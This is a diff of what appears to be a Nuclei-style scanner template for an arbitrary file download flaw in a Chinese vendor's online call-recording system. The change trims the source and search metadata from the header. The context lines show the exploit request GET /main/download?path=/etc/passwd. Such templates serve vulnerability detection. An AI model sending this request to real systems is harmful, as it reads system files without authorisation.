@@ -3,14 +3,8 @@ info:
   name: 申瓯通信设备有限公司在线录音管理系统存在任意文件下载漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/84d7dc75ed6478321fa392352f2f4094
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 84d7dc75ed6478321fa392352f2f4094
-    fofa: + fofa`title="在线录音管理系统"`
 http:
 - raw:
   - 'GET /main/download?path=/etc/passwd HTTP/1.1
